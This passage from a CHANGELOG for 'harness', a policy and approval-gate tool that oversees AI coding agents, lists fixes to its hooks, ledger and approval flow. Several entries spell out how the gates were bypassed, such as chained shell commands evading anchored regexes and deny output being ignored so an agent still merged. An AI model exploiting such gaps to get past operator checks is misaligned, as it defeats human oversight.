  `sessionSource` for in-process callers. (#118)

## [0.11.0] - 2026-05-14

**Headline: the policy layer works end-to-end and is legible.** The
founding-incident preflight loop is now closed: `harness session-start
preflight` produces the `preflight:${REPO}` / `preflight:${BRANCH}` tags
(#111), `${REPO}` / `${BRANCH}` resolve per-repo instead of collapsing
to one global `preflight:` tag (#110), and `harness audit` /
`explain --trace` can finally read the decisions the engine records
(#108). `harness doctor` now surfaces a `block` policy that has no
producer for its required tag (#109) instead of reporting it healthy.
And the understanding gate no longer hard-locks a session: its hook
asks instead of denying for the operator-approval command (#105), which
resolves the session id from a staging file with no arguments (#107).

### Added

- `harness session-start preflight`: the SessionStart producer for the
  `preflight-before-*` policies. The Full template restores its
  `git-preflight` hook wired to this command; it runs `agent-preflight`
  (`preflight run --json <cwd>`) against the session cwd and, on a
  `ready:true` result, records one ledger fact carrying both
  `preflight:${REPO}` and `preflight:${BRANCH}` so it satisfies
  `preflight-before-investigation` (REPO, within 1h) and
  `preflight-before-push` (BRANCH, within 10m). Both are resolved with
  the same git-context walk the intercept engine uses, so producer and
  consumer agree on the tags. Caveat: a SessionStart producer cannot
  keep the 10m push window fresh through a long session, so
  `preflight-before-push` benefits from a push-time refresh that this
  hook does not provide. A `ready:false` result deliberately leaves the
  tags unwritten so the gates stay closed. SessionStart hooks are
  `blocking:false`: a missing `preflight` binary, a timeout, or an
  unreachable ledger logs one line to stderr and exits 0, never
  breaking the session. The Full init profile now lists
  `@lannguyensi/agent-preflight` so the wizard offers to install it. (#111)
- `harness doctor` now flags a `block`-enforcement policy whose required
  ledger tag carries a `requires.within` freshness window but has no
  producer hook in the manifest. Such a policy needs the tag kept fresh,
  so with nothing producing it the gate silently walls off whatever it
  triggers on while doctor still reports it healthy. Producer detection
  is a coarse substring match of the tag prefix against hook commands,
  excluding the policy's own consumer hook: it is a floor, so "no
  producer found" is reliable but "producer found" is heuristic and can
  miss tag-suffix or cadence mismatches. Policies without a `within`
  window are not flagged, since a one-time tag is supplied by the normal
  review / PR workflow. Each gap counts as a doctor warning. (#109)
- `harness approve understanding` now resolves the session id from a
  `harness.generated/.pending-approval` staging file when neither
  `--session` nor `$CLAUDE_SESSION_ID` is given. The
  `understanding-before-execution` PreToolUse hook writes the blocked
  session's id to that file on every block or ask, so an arg-less
  `harness approve understanding` run from the operator's `!`-shell (where
  `$CLAUDE_SESSION_ID` is not set) resolves the exact id instead of the
  operator hand-deriving it from the newest project transcript. The CLI
  prints which tier supplied the id, and the staging file is consumed on a
  successful approve so a later call cannot revive a stale id. (#107)

### Fixed

- The `${REPO}` and `${BRANCH}` policy-template builtins resolved only
  from the `HARNESS_REPO` / `HARNESS_BRANCH` env vars, which nothing
  sets, so every `preflight:${REPO}` and `preflight:${BRANCH}` ledger
  tag collapsed to the literal `preflight:`. That silently degraded the
  founding-incident policies to one session-global tag: a preflight run
  in repo A satisfied the gate in repo B, defeating the per-repo
  isolation the policies are written to provide. The intercept engine
  now derives `REPO` (work-tree basename) and `BRANCH` from the tool
  event's `cwd` via a bounded filesystem walk (no `git` subprocess, so
  it stays cheap on the per-tool-call hook path); the env vars are kept
  as an explicit operator override. `harness dry-run` resolves them the
  same way so its prediction matches runtime. (#110)
- `harness audit` and `harness explain --trace/--last` reported "no
  policy decisions" even though `harness policy intercept` had recorded
  them: the readers resolved the session id via `resolveSessionId`,
  which falls back to the literal `"default"` session when neither
  `--session` nor `$CLAUDE_SESSION_ID` is set, and Claude Code does not
  export `$CLAUDE_SESSION_ID` into the Bash tool environment. The
  read path now uses `resolveReadSessionId`, which adds a
  transcript-discovery tier: it reads the live session id off the newest
  `~/.claude/projects/*/<uuid>.jsonl`. The write path (`policy
  intercept`) is unchanged. Separately, `realLedgerClient.record` no
  longer discards `recordPolicyDecision`'s failure result; a failed
  audit write now emits a one-line stderr diagnostic. (#108)
- The `understanding-before-execution` policy pack's PreToolUse hook
  hard-denied every `Edit`/`Write`/`Bash` call until an Understanding
  Report was approved, including `harness approve understanding` itself (a
  Bash call caught by the same matcher). A hook `deny` gives no interactive
  prompt, so the gate could lock a session out with no in-session recovery.
  The hook now emits `permissionDecision: "ask"` for the operator-approval
  command `harness approve ...` instead of `"deny"`: Claude Code surfaces
  the normal permission prompt, and the operator's approval of that prompt
  is the human approval the gate was waiting for. The escape-command match
  is strict (no shell chaining, substitution, or redirection), so it cannot
  be used to smuggle other work past the gate. (#105)

## [0.10.0] - 2026-05-14

**Headline: the init wizard becomes a real installer, the Full template
goes self-contained, and a class of cwd-relative path footguns is closed.**
Operators on `npm i -g @lannguyensi/harness` were still on v0.9.1 behavior:
a stale agent-tasks MCP template, a buried apply hint, unbundled Full
hooks, and a literal-tilde `EVIDENCE_LEDGER_DB` env that scattered rogue
ledger databases. This release ships those fixes plus a hardened publish
workflow and a policy-matching correctness fix.

### Added

- `harness init --interactive` is now a real installer: it runs a
  per-profile dependency check, offers to `npm i -g` the missing packages
  with operator permission, and aborts cleanly with a manual-install
  fallback on failure. A wire-now prompt at the end offers to run
  `harness apply` immediately. Full is surfaced as a fourth wizard
  profile. (#98)

### Changed

- `harness init` templates now reference published bin names
  (`agent-tasks-mcp-bridge`, `memory-router-user-prompt-submit`,
  `grounding-mcp`) instead of `~/git/pandora/...` local paths. The Full
  template is self-contained: its PreToolUse hooks run through the bundled
  `harness policy intercept` engine, so no external shell scripts are
  required. Full now also ships `Glob` + `Grep` in `builtin.known` and
  includes the understanding-before-execution policy pack. (#98, #100)
- `harness apply` Next-steps now leads with the user-global
  `--target ~/.claude/settings.json --merge` recommendation, and uses a
  softer lede on no-op re-runs. Hooks with an identical
  `(command, timeout)` inside one matcher group are deduplicated. (#97)
- `.github/workflows/publish-npm.yml` retries the `npm publish` step up to
  3 times with exponential backoff to ride out transient Sigstore Rekor
  `TLOG_CREATE_ENTRY` 409s, short-circuits when the version is already on
  the registry, and gains a `workflow_dispatch` trigger with a `tag` input
  so a release can be re-published without re-tagging. (#102)

### Fixed

- `harness init`: the interactive wizard wired a stale agent-tasks MCP
  template, `harness apply`'s target was not surfaced clearly, and a
  `{project}` memory-dir pattern produced a false-positive warning. (#97)
- `harness doctor` treats `{project}` patterns as informational rather
  than a warning. The memory-router probe resolves bare bin names through
  `PATH` and guards against `node` / `npx` / wrapper false positives.
  (#97, #100)
- `harness approve understanding`: the no-session-id error message is
  expanded with concrete one-liners for retrieving the active session id.
  (#100)
- `grounding-mcp` wiring: the literal-tilde `EVIDENCE_LEDGER_DB` env block
  is removed from the Team and Full templates. It expanded to a literal
  `~` directory and scattered rogue `<cwd>/~/.evidence-ledger/` databases
  on every spawn cwd; the ledger now resolves to `~/.evidence-ledger/` via
  `os.homedir()`. An apply-time warning catches operators still carrying
  the old wiring. (#101)
- Policy `bash_match` regexes in the reference manifest
  (`preflight-before-investigation`, `preflight-before-push`,
  `dogfood-before-release`) were start-anchored (`^git push`), so a
  command that did not literally begin with the pattern, such as
  `cd <repo> && git push`, `git -C <repo> push`, or an env-var-prefixed
  `git push`, slipped past the gate ungated. The patterns now match at
  command position: start of string, or after `;`, `|`, `&&`, `(`, a
  newline, or optional env-var assignments. String-argument mentions like
  `git commit -m "...git push..."` and `echo "git status"` are not
  false-positives. (#103)
- CI: the interactive-wizard tests no longer shell out to a real
  `npm i -g` on CI runners. (#99)

## [0.9.1] - 2026-05-13

**Headline: wizard hint fix + two new canonical example policies.** A
patch release for the surface that shipped in v0.9.0. The interactive
wizard printed a `harness apply --runtime claude` follow-up that was
not a valid runtime value (`claude-code` and `codex` are accepted, not
`claude`); operators who ran `harness init --interactive` on v0.9.0
saw the wrong instruction. Fixed in source and the documentation
echo, plus a regression test that locks the corrected hint. The
reference manifest gains two more example policies covering incident
classes already documented in the operator's memory log.

### Fixed

- `harness init --interactive`: the wizard's "Next:" hint after a
  successful run now prints `harness apply --runtime claude-code`
  (not `harness apply --runtime claude`, which fell back to the
  default at runtime with a warning). Source fix in
  `src/cli/init/interactive.ts` and the matching echo in
  `docs/init-interactive.md`. Regression guard locked in
  `tests/cli/init-interactive.test.ts` so the next drift fails loudly.
  (#94)

### Changed

- `docs/for-humans.md`: added a "First-time setup (recommended)"
  block that walks operators through `harness init --interactive`
  before the manual template path; replaced the bogus
  `--template starter` invocation with `--template solo` and listed
  the four valid templates. (#94)
- `docs/for-agents.md`: split the CLI cheat-sheet's `init` row into
  `init --template`, `init --interactive`, and `init --probe` (the
  last is read-only); added rows for `pack add/remove/list`,
  `approve understanding`, and `doctor --target codex`. (#94)
- `README.md`: one-line bridge from the "Try it in 60 seconds"
  dry-run pitch to `npm i -g @lannguyensi/harness && harness init
  --interactive` so readers can graduate from evaluation to install
  without scrolling. (#94)

### Added

- Two new canonical policy patterns in
  `docs/examples/full-manifest.yaml` and
  `src/cli/init/templates.ts:FULL_TEMPLATE`:
  `review-subagent-before-pr-create` gates
  `mcp__agent-tasks__pull_requests_create` on a
  `review-subagent:${TASK_ID}` ledger entry (stronger than
  `review-before-merge` because the rigorous review subagent must
  have actually run BEFORE the PR opens). `preflight-before-push`
  gates `Bash` matching `^git push` on a fresh `preflight:${BRANCH}`
  entry with `within: 10m` (complements the read-side
  `preflight-before-investigation`). Both policies wired into the
  init template so `harness init --template full` produces a
  manifest consistent with the example file. Field-level invariants
  locked in `tests/schema.test.ts`. (#95)
- `docs/for-humans.md`: "More policy patterns" section that walks
  operators through both new gates plus `dogfood-before-release` as
  a coherent set. (#95)

## [0.9.0] - 2026-05-13

**Headline: guided onboarding.** `harness init` grows three new entry
points so first-time operators do not have to hand-author a manifest.
`harness init --interactive` runs a wizard via `@inquirer/prompts` that
detects the environment, picks a profile, and writes a validate-clean
starting manifest. `harness init --template solo|team` lands the two
new opinionated profile templates non-interactively. `harness init
--probe` prints a read-only JSON snapshot of what the harness sees in
the operator's config dirs.

### Added

- `harness init --interactive`: guided wizard that detects the
  environment, picks a profile (Solo / Team / Custom), confirms a
  memory directory, writes the manifest, and runs `harness validate`.
  Aborts cleanly on Ctrl-C with no partial write. The wizard never
  invokes `harness apply` itself, it prints the suggested command and
  lets the operator review the manifest first. Adds `@inquirer/prompts`
  as a runtime dependency. Operator docs: `docs/init-interactive.md`.
  E2E smoke: `dogfood/interactive-init/scripted-solo.mjs`.
- `harness init --template solo|team`: two new opinionated profile
  templates beside the existing `minimal` / `full` pair. `solo` wires
  memory-router plus the `understanding-before-execution` policy pack.
  `team` extends solo with the `agent-tasks` MCP server,
  `grounding-mcp` (required for policy enforcement to bind, per
  `feedback_harness_policies_warn_mode`), and the `review-before-merge`
  policy. Both profiles pass `harness validate` cleanly. The `team`
  hook command uses the built-in `harness policy intercept` CLI verb,
  so no per-policy shell script under `~/.claude/hooks/` needs to exist
  for the gate to fire.
- `harness init --probe`: read-only JSON snapshot of detected runtimes
  (Claude Code, Codex), the existing `~/.claude/harness.yaml`, and MCP
  servers wired in Claude's `settings.json`. Foundation for the
  `init --interactive` wizard, standalone-useful for operators
  debugging what the harness sees in their environment.

### Changed

- The README's first-time-setup path now points at
  `harness init --interactive` instead of jumping straight to `dry-run`.

## [0.8.1] - 2026-05-11

**Headline: policy-pack enforcement actually blocks now.** 0.8.0 shipped
the runtime intercept, the ledger plumbing, and the manifest schema, but
the deny path was effectively observability-only: Claude Code never
honoured the hook output shape harness emitted, so a denied tool call
proceeded to the MCP transport and only failed at the downstream
service. Live verification on 2026-05-11 against
`mcp__agent-tasks__pull_requests_merge` with no matching
`review:${PR_NUMBER}` ledger entry confirmed the new build is refused
at the hook layer, before reaching agent-tasks. Operators on 0.8.0
should upgrade.

### Changed

- `harness policy intercept` now writes a one-line stderr diagnostic
  when the manifest has policies but none of them matched the inbound
  event, e.g. `no policy matched event hook_event_name=(missing)
  tool_name="..." (registered policy events: PreToolUse). If probing
  by hand, ensure stdin includes hook_event_name (...).`. Previously
  the engine exited 0 with empty stdout in that case, so an operator
  hand-probing the CLI without `hook_event_name` saw what looked like
  "the policy did not load" while the real cause was just a stripped
  trigger field. The hint fires unconditionally (not gated on
  `--verbose`) and stdout is unchanged, so the Claude Code hook
  contract is preserved. Also extends the `harness policy intercept`
  command help with the documented stdin shape so the next operator
  does not have to source-dive. (Tracked as `harness#4fef0e1f`.)

### Fixed

- `harness policy intercept` now emits a Claude Code hook output that
  Claude Code actually honours as a deny. Previously the CLI wrote
  `{"decision":"deny","reason":...}`, which Claude Code parsed as "no
  recognised decision" (the documented top-level value is `"block"`,
  not `"deny"`) and let the tool call proceed; the policy ran, the
  `policy_decision` row landed in the ledger, but the agent still
  merged. The new payload always carries the documented top-level
  `decision: "block"` field, and for PreToolUse events it additionally
  emits the `hookSpecificOutput.permissionDecision: "deny"` envelope
  Claude Code 2.1+ prefers. Non-PreToolUse events (UserPromptSubmit,
  PostToolUse, Stop, ...) get the top-level form only, since
  `permissionDecision` is PreToolUse-only per Anthropic's hook
  protocol. Repro for the regression was a
  `mcp__agent-tasks__pull_requests_merge` call with no matching
  `review:${PR_NUMBER}` ledger entry: it reached agent-tasks and 404'd
  there instead of being blocked at the hook. The sibling
  Understanding-Gate emitter at `src/cli/pack/hook-pre-tool-use.ts`
  was unaffected; it already emits `decision: "block"`, though it does
  not yet carry the modern envelope. (Tracked as `harness#2436d9bf`.)

## [0.8.0] - 2026-05-10

**Headline: Understanding-Gate Policy Pack, end-to-end.** Phase 6 lands
the *Policy Pack* concept as a first-class harness unit: a reusable
bundle of instruction template, hooks, policies, and permission
profiles that ships under one name and is referenced from
`harness.yaml` with one key. The first showcase pack,
`understanding-before-execution`, forces an agent to expose its task
interpretation, an Understanding Report, before any write-capable
tool fires. The user confirms or corrects; only after explicit
approval is recorded as evidence may the agent edit, run shell,
commit, push, or open a PR. The pack ships across two runtimes
(Claude Code and Codex), three permission profiles
(`safe-start` / `implementation-after-approval` / `high-risk-grill-me`),
a CLI surface (`harness pack add / remove / list`,
`harness apply --runtime <runtime>`, `harness approve understanding`,
`harness doctor --target codex`), and a synthetic-stdin dogfood smoke
under `dogfood/phase6-6/` that exercises block, allow, capture, and
approve round-trips without a real Codex binary.

Operator note: no schema bump (still `version: 1`). New manifest blocks
(`policy_packs:`, `permission_profiles:`) are additive and default to
empty, so `0.7.0` manifests parse byte-identically. Manifests with the
pack enabled need a one-time `harness apply` after upgrade so the new
`harness pack hook pre-tool-use` blocker replaces the npm package's
standalone bin in the rendered `settings.json`. Ensure `harness` is on
`$PATH` (`npm i -g @lannguyensi/harness@0.8.0`) before the next session
starts.

### Added
- Phase 6 #6 follow-up: `harness pack hook codex-stop` captures the
  agent's Understanding Report into
  `.understanding-gate/reports/<iso>-codex-<sessionhash>.json` with
  `approvalStatus: "pending"`. Wire format on stdin accepts either
  `last_assistant_message` directly or a `messages[]` array (the last
  assistant entry is used). The parser recognises markdown headings,
  bold labels, and plain colon-prefixed labels for the six report
  fields (interpretation, assumptions, openQuestions, outOfScope,
  risks, verificationPlan), with synonym support (Questions,
  Exclusions, Validation). Failure modes (malformed input, missing
  session id, unwritable reports dir, no recognisable fields)
  resolve to exit 0 + a stderr diagnostic; capture must never block
  the agent's stop path. The Codex pack now contributes a Stop hook
  alongside UserPromptSubmit and PreToolUse. Closes agent-tasks
  `adf356a0`.
- Phase 6 #6 follow-up: `harness doctor --target codex` evaluates the
  harness side of the Codex adapter (binary resolution, harness-managed
  `harness.generated/codex/config.toml` presence + banner, contributed
  `[[hooks.*]]` command resolution, and persisted-report directory
  writability). Codex error/warning counts roll into the top-level
  totals; `--json` adds a structured `codexTarget` block to the
  `DoctorReport`. The default `harness doctor` invocation is
  unchanged. Closes agent-tasks `125fd02b`.
- Phase 6 #6: Codex adapter for the `understanding-before-execution`
  policy pack. New CLI flag `harness apply --runtime codex` emits
  `harness.generated/codex/config.toml` (TOML hook stanzas) instead of
  `settings.json`; operators copy or include the generated TOML into
  their own `~/.codex/config.toml`. Two new pack hook subcommands ship:
  `harness pack hook codex-pre-tool-use` (PreToolUse blocker on
  `apply_patch|Bash|shell`: exit 2 + reason on stderr when no source
  has approved, exit 0 otherwise) and `harness pack hook
  codex-user-prompt-submit` (instruction-template injector that emits
  the Understanding-Gate prompt on stdout for Codex to prepend to
  `additional_instructions`). The Codex blocker shares the
  approval-check pipeline with the Claude Code blocker (ledger source
  via grounding-mcp + persisted report under
  `.understanding-gate/reports/`, either approves). Synthetic-stdin
  smoke under `dogfood/phase6-6/` exercises block + allow paths
  end-to-end without a Codex binary. `--target` is rejected with
  `--runtime codex` (target wires Claude Code's `settings.json`, not
  produced under codex). Phase 6 #6 follow-ups filed as separate
  agent-tasks entries: `harness doctor --target codex` adapter-health
  check; Codex Stop-equivalent for transcript capture; permission
  profile translator into Codex's sandbox shape.
- Phase 6 anchor: additive `policy_packs:` manifest block (schema-only;
  no runtime behaviour yet). Each entry has `name`, `source`
  (default `builtin`), `enabled`, optional `description`, and an
  opaque `config:` record validated by the pack itself at resolve
  time. Duplicate names rejected at parse time; `.strict()` rejects
  unknown keys per entry. The block defaults to `[]` so manifests
  written for `0.7.0` parse byte-identically.
- `docs/policy-packs/understanding-before-execution.md`: canonical
  documentation for the first Policy Pack, covering target
  architecture, manifest reference, mode semantics, permission-profile
  sketches, adapter notes for Claude Code / OpenCode / Codex, and the
  two-source approval-state model (evidence-ledger tag for harnessed
  sessions; persisted JSON report for solo `@lannguyensi/understanding-gate`
  users). Phase 6 #2 through #6 will wire the surfaces this doc
  describes; see `docs/ROADMAP.md` for the sub-task decomposition.
- `docs/examples/full-manifest.yaml` carries the canonical
  `understanding-before-execution` pack as a worked example; the
  byte-for-byte `harness describe` golden test covers the resulting
  output.
- Phase 6 #2: `harness apply` now expands enabled `policy_packs[]`
  entries into hook contributions and an operator audit copy. For the
  builtin `understanding-before-execution` pack this writes three
  namespaced hooks into the generated `settings.json`
  (`UserPromptSubmit` injector, `Stop` capture, `PreToolUse` blocker
  matching `Edit|Write|Bash`, all pointing at the
  `@lannguyensi/understanding-gate` bins) and an audit copy at
  `harness.generated/policy-packs/<name>/instructions.md`. Pack files
  flow through the existing three-state-compare + lock pipeline, so
  drift on the audit copy is caught by `harness apply` and surfaced in
  `harness diff --since-apply`. `enabled: false` skips the pack
  entirely. `harness validate` rejects an enabled pack with an
  unrecognised source (only `builtin` resolves in v1) or an unknown
  builtin name. Phase 6 #4 will add the harness-side ledger-aware
  PreToolUse blocker; the standalone blocker shipped in
  `@lannguyensi/understanding-gate@>=0.2.0` is already wired today.
- Phase 6 #3: new `harness pack` CLI subtree for managing `policy_packs[]`
  declaratively. `harness pack add <name>` performs a schema-validated
  insert (rejects unknown source/name pre-flight, then the schema
  superRefine catches duplicates). `harness pack remove <name>` is
  reference-checked against `.last-apply`: it refuses without `--force`
  when applied state is present, and `--force` removes the manifest
  entry, deletes the on-disk pack files under
  `harness.generated/policy-packs/<name>/`, and prunes the
  corresponding `.last-apply` entries so a follow-up `harness apply`
  reconverges in one step. `harness pack list [--enabled-only] [--json]`
  prints a flat table or pipeable JSON.
- Phase 6 #4: harness-side PreToolUse blocker + approve flow. The
  `understanding-before-execution` pack now ships its `PreToolUse` hook
  pointing at the new `harness pack hook pre-tool-use` runtime verb
  (was: the npm package's standalone bin). The harness blocker is the
  superset: it consults BOTH the evidence-ledger tag
  `understanding-approved:${SESSION_ID}` (via grounding-mcp's
  `ledger_summary`, canonical for harnessed sessions) AND the
  persisted JSON report under `.understanding-gate/reports/` (fallback
  for sessions without grounding-mcp wired). Either source approves;
  neither blocks the tool call with a Claude-Code-shaped deny JSON
  containing the actionable next step (`run \`harness approve
  understanding\``). Failure modes (manifest unreadable, pack disabled,
  no session id) resolve to allow with a stderr diagnostic, so the
  Understanding Gate never bricks a session. Ledger matching filters
  out `policy_decision` audit rows (typed and legacy-prefix backstop)
  so a policy decision whose serialised reason field happens to
  contain the approval substring cannot falsely approve.

  **Breaking change for users with `understanding-before-execution`
  enabled**: the regenerated `settings.json` calls `harness pack hook
  pre-tool-use` instead of the npm bin. Run `harness apply` after
  upgrading, and ensure `harness` is on `$PATH` (e.g.
  `npm i -g @lannguyensi/harness`) before the next session starts.
- New `harness approve understanding [--session <id>] [--reports-dir
  <path>] [--approved-by <actor>]` CLI verb that round-trips both
  approval sources: writes the `understanding-approved:${SESSION_ID}`
  ledger tag via `grounding-mcp`'s `ledger_add` AND flips
  `approvalStatus: "approved"` on the latest matching persisted JSON
  report (atomic rewrite). A degraded ledger surfaces as a one-line
  warning, not a hard failure, so a solo
  `@lannguyensi/understanding-gate` user without `grounding-mcp` wired
  still benefits from the persisted-report path.
- New generic `runtime/ledger-add.ts` writer mirroring the structural
  shape of `recordPolicyDecision` but exposed for non-policy-decision
  fact rows. Used by `harness approve understanding`; available to any
  future pack that wants to emit a session-tagged ledger entry without
  encoding a policy-decision payload.
- Phase 6 #5: permission profiles. New top-level `permission_profiles:`
  manifest block (additive, defaults to `{}`), with three v1 builtins
  bundled with the `understanding-before-execution` pack: `safe-start`
  (pre-approval default), `implementation-after-approval` (post-
  approval working profile), and `high-risk-grill-me` (high-friction
  for security / infra surfaces). Selection via the pack's
  `config.permission_profile`. Profile actions (`read` / `edit` /
  `bash` / `commit` / `push` / `pr` / `deploy`) translate to Claude
  Code's `permissions: { allow, ask, deny }` block at apply time;
  the new translator emits canonical tool patterns
  (`Edit`/`Write`/`MultiEdit` for `edit`, `Bash(git commit*)` for
  `commit`, etc.). `limited` and `ask_or_deny` collapse onto `ask`
  for v1 (Claude Code does not natively distinguish them); finer-
  grained shaping is a Phase 6 #5 follow-up. When multiple packs
  contribute permissions, the merge follows
  deny-wins-over-ask-wins-over-allow precedence: a stricter intent
  from any pack is not silently relaxed by a more permissive
  sibling. Profiles compose with the Phase 6 #4 PreToolUse blocker:
  the static permissions block is the always-applies floor, the
  blocker handles the conditional approval gate on top.

## [0.7.0] - 2026-05-06

**Headline: workflows-as-data and full-session audit forensics.** The
`workflows:` block (PR #66) lets adopters declare branch policy,
review-subagent gating, and merge method as schema-validated data
instead of prose in memory files. `harness session-export <sessionId>`
(PR #67) joins the on-disk Claude Code transcript JSONL with the
evidence ledger for the same session and emits a single chronologically
ordered audit artifact, with default-on regex redaction extended by a
new optional `audit.redact[]` manifest block. The README is split into
audience-specific guides (`docs/for-humans.md`, `docs/for-agents.md`)
and gains a control-loop flowchart that both audiences read
identically. `harness explain --last` closes the "what just denied me?"
loop without needing the policy name. No runtime enforcement of
`workflows:` yet; that ships as a follow-up.

Operator note: no schema bump (still `version: 1`). All new manifest
fields are optional and additive; manifests written for `0.6.0` parse
under `0.7.0` byte-identically. The new `audit.redact[]` defaults to a
denylist that catches the four obvious key/secret patterns even when
the operator declares no `audit:` block, so existing operators get
redaction-on-by-default for `session-export` for free.

### Changed
- `docs/for-agents.md` workflow lifecycle stateDiagram is now anchored
  on the four step kinds the `workflows:` schema actually defines
  (`branch`, `review_subagent`, `ci_gate`, `merge`) instead of
  agent-tasks-MCP-specific verbs (`task_start`, `open` / `in_progress` /
  `done`). A new "If you use agent-tasks MCP" footnote below the
  diagram maps the lifecycle markers to the concrete MCP verbs as one
  example integration; other task systems fit the same lifecycle.
  Spotted right after the audience split landed (PR #69).
- Root `README.md` gains a control-loop flowchart ("What harness does":
  declare, apply, enforce, record, observe, refine) that both
  audiences read identically. No audience-specific verbs (PR #69).
- Docs split into two audience-specific surfaces:
  `docs/for-humans.md` (operator guide: install, mental model, first
  hour, diagnostics cheat sheet) and `docs/for-agents.md` (workflow
  lifecycle, policy/ledger sequence, CLI cheat sheet by side-effect
  class, audit triumvirate). README shrunk to a landing page that
  picks audience, with the `Try it in 60 seconds` block, status
  checklist, and `Why this exists` preserved. Three mermaid diagrams
  added: a system flowchart in `for-humans.md`, a workflow
  stateDiagram and a policy/ledger sequenceDiagram in
  `for-agents.md`. Docs-only, no source changes (PR #68).

### Added
- `harness explain --last` traces the most recent policy decision in the
  evidence ledger without needing the policy name, closing the common
  "I just got a deny, what fired?" loop in one command instead of three.
  Pair with `--decision allow|deny|warn-degraded` to skip past intervening
  outcomes. `<policy>` and `--last` are mutually exclusive (PR #65).
- `harness session-export <sessionId>` joins the on-disk Claude Code
  transcript JSONL (`~/.claude/projects/<projectDir>/<sessionId>.jsonl`)
  with evidence-ledger rows for the same session and emits a single
  chronologically-ordered audit artifact. `--format json` (default) and
  `--format jsonl` ship in v1; `-o <file>` writes to disk. Each event
  carries an explicit `source: "transcript" | "ledger"` marker so the
  export is traceable back to its inputs (PR #67).
- New optional `audit.redact[]` block in the manifest. Each entry is
  either `{ regex, replacement? }` or `{ env_var, replacement? }`;
  `env_var:` resolves to the actual value at export time and
  string-replaces it. A default denylist (token / secret / password /
  api_key) ships even when the manifest declares no `audit:` block, so
  redaction is on by default. Manifests without `audit:` parse
  unchanged (PR #67).
- Additive `workflows:` and `review_templates:` top-level blocks in the
  manifest (still `version: 1`). Lets adopters declare review-subagent
  gating, branch policy, CI gate, and merge method as data instead of
  prose in memory files. The schema rejects duplicate workflow names,
  unknown step `kind` values, `spawn: required` without a `template`,
  and `template:` references not defined in `review_templates`. Surfaces
  via `harness describe --pillar workflows`, `harness list workflows`,
  and a new `Workflows` section in `harness doctor`. No runtime
  enforcement yet, that ships as a follow-up. Manifests without
  `workflows:` parse identically to before (PR #66).

## [0.6.0] - 2026-05-03

**Headline: the Phase-5 adoption-blocker cycle closes end-to-end.**
`harness apply` now writes directly into a Claude Code settings
discovery path (`--target` + `--merge`), translates the manifest's
`tools.mcp[]` into the settings.json `mcpServers` block (so a real
`claude -p --settings <apply'd>` session actually loads them), prints
a Next-steps hint that names the real wire-up commands instead of
leaving adopters to guess, and `harness adopt` round-trips hand-edits
to `mcpServers` back into the manifest. The full
`apply → hand-edit → adopt → apply` cycle is byte-identical on the
settings.json bytes.

Operator note: no schema changes; `harness.lock` gains an optional
`target` entry kind (additive). Existing `harness.lock` files without
target entries continue to parse. The new flags on `apply` are all
opt-in; the default invocation still writes to `harness.generated/`.
Per-package version bumped from 0.5.0 to 0.6.0; this is the first
minor release on the `@lannguyensi/harness` npm distribution. No
operator action required beyond `npm i -g @lannguyensi/harness@0.6.0`
on machines running the published binary.

### Added

- **`harness apply --target / --merge / --force`** (task `d38f6f91`, PR #58):
  write the rendered settings.json directly into a Claude Code settings
  discovery path (e.g. `.claude/settings.local.json` or
  `~/.claude/settings.json`). `--merge` does a 3-way merge that replaces
  harness-owned top-level keys (today: `hooks`, `mcpServers`) and preserves
  everything else. `harness.lock` records the target sha so `validate
  --check-lock` flags out-of-band edits. Closes the adoption blocker that
  forced every adopter into a hand `cp` or per-invocation `--settings`.
- **`apply` translates `tools.mcp[]` into the settings.json `mcpServers`
  block** (task `62380337`, PR #59). The Phase 5 #1a caveat is closed:
  `init.mcp_servers` in a `claude -p --settings <apply'd>` session now
  contains the manifest's MCP entries. Disabled servers (`enabled: false`)
  are omitted; warnings (not errors) cover entries that survive schema
  but produce no runnable command. String-form commands with embedded
  whitespace in paths must be expressed as the array form to preserve
  token boundaries.
- **`apply` prints a Next-steps hint after a successful run** (task
  `517aa919`, PR #60). After the summary line, the CLI prints concrete,
  copy-pasteable next actions: one-shot `claude -p --settings ...`,
  project-scope `harness apply --target .claude/settings.local.json`,
  and user-global `harness apply --target ~/.claude/settings.json --merge`.
  When `--target` was actually written, the hint collapses to a single
  verify line with `--settings <targetPath>` included (so non-canonical
  target paths still resolve through `claude -p`). Two new flags pair
  with this: `--quiet` suppresses the hint while keeping the summary,
  and `--json` emits a machine-readable JSON summary instead of prose
  (implies `--quiet`; refusal outcomes still set non-zero exit).
  Motivated by a 2026-05-03 hallucination incident where an agent
  fabricated a non-existent `claude -p --output-dir` flag because
  nothing in the apply output guided the wire-up step; both unit and
  CLI integration tests assert the hint never contains `--output-dir`.
- **`adopt` reverse-projection for `mcpServers` into `tools.mcp[]`**
  (task `7059d92b`, PR #61). Closes the round-trip gap: hand-edits to
  settings.json's `mcpServers` block can now be captured back into the
  manifest. New entries are appended; same-name entries with different
  command/env are replaced (preserving manifest-only fields like `health`
  and `enabled: false`, so adopting a hand-edit does not silently wipe
  doctor/probe/policy metadata). The full
  `harness apply --target ... --merge → hand-edit → harness adopt → harness apply`
  cycle is byte-identical on the settings.json bytes.

### Notes for upgraders

- The settings.json output now includes a `mcpServers` key when your
  manifest declares enabled MCP servers. On the first apply after
  upgrade, the file grows by that block. The three-state compare handles
  this safely (no spurious drift-refuse on the generated file), but if
  you have hand-edited a `mcpServers` block into a previously apply'd
  settings.json, the next apply will refuse (`drift-refuse`) until you
  reconcile via `harness adopt` or `--overwrite-drift`.

## [0.5.0] - 2026-05-01

**Phase 5: dogfood + polish.** Phase 4 shipped policies that fire; Phase 5
ran them end-to-end against real grounding-mcp + the live SQLite ledger,
caught the bugs that surfaced, and turned the whole feedback loop into a
quality-of-life pass over `audit`/`explain`/`policy intercept`. The
package is now also distributed under `@lannguyensi/harness` on npm
(install with `npm i -g @lannguyensi/harness` and use `harness ...` from
the command line).

The killer-test from the founding incident still works exactly the same
way; this release is about it staying that way under realistic
operational pressure.

### Added

- **`harness policy intercept --verbose`** (Phase 5 #3, PR #44) — opt-in
  stderr diagnostics for non-allow decisions: policy name, ledger_tag,
  matched count, reason, and sorted extract values. Default off; v0.4.0
  byte-equivalent. Also enabled via `HARNESS_POLICY_VERBOSE=1`
  (case-insensitive disable: `0`/`false`/`no`/`off`).
- **`$CLAUDE_SESSION_ID` env fallback** (Phase 5 #2, PR #43) for
  `audit`/`explain --trace`/`policy intercept` when `--session` is
  omitted. Real Claude Code sessions arrive via `event.session_id`, so
  reads under the literal `"default"` were silently invisible. New
  precedence: explicit > env > `"default"`.
- **`policy_decision` first-class entry type** (Phase 5 #4, PR #47) via
  the matching `@lannguyensi/evidence-ledger@0.2.0` change. Writer
